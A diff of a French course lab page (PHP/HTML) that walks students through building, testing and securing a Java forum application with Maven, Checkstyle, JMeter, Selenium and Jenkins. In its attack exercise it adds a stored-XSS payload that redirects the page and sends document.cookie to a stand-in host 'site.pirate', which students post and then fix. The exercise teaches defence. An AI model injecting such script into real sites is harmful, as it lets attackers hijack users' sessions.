@@ -92,10 +92,12 @@ margin-right:5px;
 $group_port=getenv('GPORT');
 $darray = explode(':', $_SERVER['HTTP_HOST']);
 $host=$darray[0];
+$apache_url="http://" . $host . ":" . $group_port . "80/";
 $jenkins_url="http://" . $host . ":" . $group_port . "81/";
 $sonar_url="http://" . $host . ":" . $group_port . "82/";
 echo "<BR/>Host=" . $host;
 echo "<BR/>Group Port=" . $group_port;
+echo "<BR/>Apache Url=" . $apache_url;
 echo "<BR/>Jenkins Url=" . $jenkins_url;
 echo "<BR/>Sonar Url=" . $sonar_url;
 ?>
@@ -170,31 +172,33 @@ Récupérer le projet depuis le repository Git de votre groupe :
 <img alt="" src="images/Git2.PNG"> 
 <p/>
 </li>
-<li>Importer le projet dans votre Workspace via Import => Git => Projects from Git => Existing Local repository => source-code-practice-course => Import as general project</li>
 </ul>
 
 <br />
-Importez le projet Forum à partir de SVN en tant que « Dynamic Web Project » avec les paramètres suivants  :
+Importer le projet dans votre Workspace via les menus suivants
 <ul>
-<li>Dossiers de sources : src/main/java et src/main/resources.</li>
-<li>Sources target : target/classes.</li>
-<li>Content directory : src/main/webapp.</li>
-<li>Ne pas créer le fichier web.xml.</li>
-<li>Vérifiez que le projet est bien associé au JDK 1.6.</li>
+<li>Import</li>
+<li>Git</li>
+<li>Projects from Git</li>
+<li>Existing Local repository</li>
+<li>source-code-practice-course</li>
+<li>Import as general project</li>
 </ul>
 </p>
 <p class="instructions">
-<a href="videos/Importer le projet.mov" class="video" target="_blank">Voir la vidéo</a>
-<br /><br />
 Essayez de compiler le projet. <span class="questions">Que constatez-vous ?</span>
 </p>
 <p class="instructions">
-Installez le projet avec la commande Maven adéquate en utilisant la commande <span class="command">Configure->Convert to Maven Project</span> du menu contextuel du projet (<a href="videos/Activer Maven sur le projet.mov" class="video" target="_blank">Voir la vidéo</a>). 
+Transformez votre projet en projet Maven grâce au plugin Maven d'Eclipse : utiliser la commande <span class="command">Configure->Convert to Maven Project</span> du menu contextuel du projet. 
 <br />
 Regardez la console Maven. <span class="questions">Que se passe-t-il ?</span>
 <div class="note">
-Si le projet ne compile toujours pas, forcez la mise à jour des dépendances (<a href="videos/Mettre à jour les dépendances Maven.mov" class="video" target="_blank">Voir la vidéo</a>).
+Si le projet ne compile toujours pas ou si vos settings Maven existants ne permettent pas de récupérer correctement les dépendances, paramétrez votre projet grace au plugin Eclipse de Maven (en spécifiant éventuellement des settings.xml spécifiques grâce aux paramètres --settings et --global-settings)
+<p>
+<img alt="" src="images/Mvn_Eclipse.PNG"> 
+</p>
 </div>
+
 </p>
 <p class="instructions">
 <span class="questions">Faites des commentaires sur le projet : architecture, structure du code...</span>
@@ -205,7 +209,10 @@ Si le projet ne compile toujours pas, forcez la mise à jour des dépendances (<a 
 En activant le plugin Maven sur le projet, deux dossiers ont été ajoutés au build path. <span class="questions">Quels sont-ils ?</span>
 </p>
 <p class="instructions">
-Ces classes contiennent des tests unitaires, exécutez-les dans Eclipse (<a href="videos/Exécuter les tests unitaires.mov" class="video" target="_blank">Voir la vidéo</a>).
+Ces classes contiennent des tests unitaires, exécutez-les dans Eclipse.
+<p>
+<img alt="" src="images/Test1.PNG"> 
+</p>
 </p>
 <p class="instructions">
 Lancez la commande <span class="command">Maven Install</span> dans le menu <span class="command">Run As</span> de votre projet. Regardez le contenu du dossier target de votre projet. <span class="questions">Que contient-il ? D'où viennent tous ces fichiers, et à quoi servent-ils ? (Inutile de les lister un par un, donnez juste un aperçu.)</span>
@@ -213,9 +220,17 @@ Lancez la commande <span class="command">Maven Install</span> dans le menu <span
 
 <h3>Exécuter le projet sur un serveur</h3>
 <p class="instructions">
-Exécutez votre projet sur le serveur Jetty embarqué dans le plugin Run-Jetty-Run (<a href="videos/Lancement du projet dans Tomcat.mov" class="video" target="_blank">Voir la vidéo</a>).
+Exécutez votre projet sur le serveur Jetty embarqué dans le plugin Run-Jetty-Run.
+<p>
+<img alt="" src="images/Run_Jetty1.PNG">
+</p>
+
 <br />
 Ouvrez le lien <a href="http://localhost:8080/forum">http://localhost:8080/forum</a> pour utiliser l'application et voir comment elle fonctionne : créez vous un compte, connectez-vous...
+<br />
+<br />
+Relancer l'application en mode debug afin de comprendre le système de traitement par couches mis en oeuvre. <span class="questions">Combien identifiez-vous de couches logicielles dans le programme ? Quelles sont d'apres vous les avantages / inconvénients d'une telle conceptaion ?</span> 
+<br />
 <br />
 Des données sont déjà présentes dans la base de données. <span class="questions">A quel moment sont-elles chargées ? Fouillez le projet dans Eclipse pour trouver comment cela est fait.</span>
 </p>
@@ -224,7 +239,8 @@ Des données sont déjà présentes dans la base de données. <span class="questions"
 
 <h3>Analyser la qualité et le respect des conventions de codage</h3>
 <p class="instructions">
-Activez le plugin Checkstyle sur le projet (<a href="videos/Activer checkstyle.mov" class="video" target="_blank">Voir la vidéo</a>).
+Activez le plugin Checkstyle sur le projet.
+<img alt="" src="images/CheckStyle1.png">
 <br />
 Si les erreurs ne sont pas affichés, exécuter la commande <span class="command">Check code with Checkstyle</span> dans le menu <span class="command">Checkstyle</span>.
 </p>
@@ -232,7 +248,7 @@ Si les erreurs ne sont pas affichés, exécuter la commande <span class="command">
 Regarder la liste des infractions et corrigez-en quelques-unes (les plus simples suffiront). Vérifiez vos corrections.
 </p>
 <p class="instructions">
-Modifiez la configuration Checkstyle (<a href="videos/Configurer checkstyle.mov" class="video" target="_blank">Voir la vidéo</a>) :
+Modifiez la configuration Checkstyle :
 <ul>
 <li>Autoriser des longueurs de lignes à 120 caractères,</li>
 <li>Activez la vérification de complexité cyclomatique avec un maximum de 8.</li>
@@ -242,7 +258,7 @@ Modifiez la configuration Checkstyle (<a href="videos/Configurer checkstyle.mov"
 <h3>Attaquer l'application</h3>
 <p class="instructions">
 Connectez-vous sur l'application et créez le message suivant sur un sujet : 
-<span class="command">&lt;script src="http://<ip_config>/js/cookie.js">&lt;/script></span>
+<span class="command">&lt;script type="text/javascript">document.location='http://site.pirate/sessionhijacking?'+document.cookie&lt;/script></span>
 <br />
 <span class="questions">Constatez le problème et le risque encouru. Quelle peut être la cause du problème ?</span>
 <br />
@@ -251,7 +267,7 @@ Regardez le code de la JSP <span class="command">src/main/webapp/view/topic/view
 <br />
 <span class="questions">Quelle critique pouvez-vous faire ces instructions ? Corrigez-le problème, redémarrez le serveur et réitérez l'attaque pour vérifier que cette faille est résolue.
 <br />
-Une fois que vous vous êtes assuré(e) que cela est fixé, livrez votre modification sur le serveur Subversion.</span>
+Une fois que vous vous êtes assuré(e) que cela est fixé, livrez votre modification sur le repository Git.</span>
 </p>
 
 <p class="instructions">
@@ -262,12 +278,12 @@ Regardez la console de votre serveur et observez les traces SQL. <span class="qu
 
 <h3>Vérifier les performances avec JMeter</h3>
 <p class="instructions">
-Téléchargez ce <a class="tools" href="outils/jakarta-jmeter-2.8.zip">package</a> contenant JMeter et dézippez-le.
+Téléchargez <a href="http://jmeter.apache.org/download_jmeter.cgi">JMeter</a> et dézippez-le.
 <br />
 A partir du dossier bin ainsi dézippé, lancez la commande jmeter.bat ou jmeter.sh en fonction de votre système d'exploitation. (Attention, pour les systèmes à base Unix, il peut être nécessaire d'ajouter le droit d'exécution sur le fichier avant de le lancer : <span class="command">chmod +x *.sh</span>)
 </p>
 <p class="instructions">
-A partir du fichier <a href="outils/Plan de Test-vide.jmx" class="tools">Plan de Test.jmx</a> et de ce <a href="documents/Créer%20le%20scénario%20JMeter.docx" class="video" target="_blank">document</a>, enregistrez le scénario suivant sur l'application forum :
+A partir du fichier <a href="<?=$apache_url?>/documents/ScenarioJMeter.docx">document</a>, enregistrez le scénario suivant sur l'application forum :
 <ul>
 <li>Ouvrez la page d'accueil,</li>
 <li>Connectez-vous avec un mot de passe ou un login erroné,</li>
@@ -281,7 +297,7 @@ A partir du fichier <a href="outils/Plan de Test-vide.jmx" class="tools">Plan de
 Retirez les éventuelles requêtes non attendues.
 </p>
 <p class="instructions">
-Configurez le scénario pour une exécution avec 50 unités, sur 10 secondes avec une seule itération (<a href="videos/Exécuter les tests depuis JMeter.mov" class="video" target="_blank">Voir la vidéo</a>).
+Configurez le scénario pour une exécution avec 50 unités, sur 10 secondes avec une seule itération.
 <br />
 Exécutez le scénario dans cette configuration.
 </p>
@@ -291,34 +307,38 @@ Ajoutez des assertions pour valider le test (Texte dans le contenu)...
 Exécutez le scénario dans cette nouvelle configuration (n'oubliez pas de (re)créer un "arbre de résultats" pour voir les résultats des assertions).
 </p>
 <p class="instructions">
-Enregistrez le plan de test dans un fichier nommé "Plan de test - complet.jmx".
+Enregistrez le plan de test dans un fichier nommé "PlanDeTestComplet.jmx".
 </p>
 <p class="instructions">
-Modifiez légèrement les valeurs des unités et durée de montée ne charge. <span class="questions">Que constatez-vous sur les résultats des assertions ?</span>
+Modifiez légèrement les valeurs des unités et durée de montée en charge. <span class="questions">Que constatez-vous sur les résultats des assertions ?</span>
 </p>
 
 <p class="instructions">
-Dans votre fichier pom.xml, décommentez les lignes à partir du commentaire <span class="command">"Activez le plugin JMeter à partir d'ici"</span>. Le fichier du scénario est déjà inclu dans votre projet dans <span class="command">test/jmeter</span>.
+Dans votre fichier pom.xml, décommentez les lignes à partir du commentaire <span class="command">"Activez le plugin JMeter à partir d'ici"</span> jusqu'au commentaire commentaire <span class="command">"Fin de l'activation du plugin JMeter"</span>. Le fichier du scénario est déjà inclu dans votre projet dans <span class="command">test/jmeter</span>.
 <br />
-Lancez le lifecycle <span class="command">integration-test</span> sur votre projet (<a href="videos/" class="video" target="_blank">Voir la vidéo</a>).
+Lancez le lifecycle <span class="command">integration-test</span> sur votre projet.
 <br /><br />
 Regardez ensuite le rapport HTML dans le dossier <span class="command">target/jmeter/report</span>.
 </p>
 
 <h3>Tester la UI (User Interface) avec Selenium</h3>
 <p class="instructions">
-Installez le <a class="tools" href="http://release.seleniumhq.org/selenium-ide/1.9.1/selenium-ide-1.9.1.xpi">plugin Selenium</a> à partir de Firefox.
+Installez le <a class="tools" href="http://release.seleniumhq.org/selenium-ide/2.5.0/selenium-ide-2.5.0.xpi">plugin Selenium</a>.
 <br />
-Enregistrez le même scénario que pour JMeter, ajoutez des assertions dans votre scénario et exécutez-le au ralenti (<a href="videos/Enregistrer et exécuter les tests avec Selenium.mov" class="video" target="_blank">Voir la vidéo</a>).
+Enregistrez le même scénario que pour JMeter, ajoutez des assertions dans votre scénario et exécutez-le au ralenti.
 </p>
 
 <h2>Etape 4 - Intégration continue</h2>
 
 <h3>Déclarer le projet dans Jenkins</h3>
 <p class="instructions">
-Créez un compte sur <a href="/jenkins" class="tools" target="_blank">Jenkins</a>.
+Commitez l'ensemble de vos modifications (git commit -m "Commentaire de commit") puis pousser (git push) les vers votre repository distant.
 <br />
-Déclarez le projet forum_xx (où xx est votre numéro d'utilisateur) et configurez l'accès à Subversion (même URL que celle utilisée au début de ce TP) et le chemin relatif du fichier pom.xml (<a href="videos/Ajouter le projet dans Jenkins.mov" class="video" target="_blank">Voir la vidéo</a>).
+Connectez-vous à votre environnement Jenkins <a href="<?=$jenkins_url?>" />
+<br />
+Activez dans jenkins le plugin git
+<br />
+Déclarez un nouveau job
 <br />
 Exécutez un build avec la configuration actuelle et inspectez les résultats. <span class="question">Décrire ce qui est exécuté ?</span>
 </p>
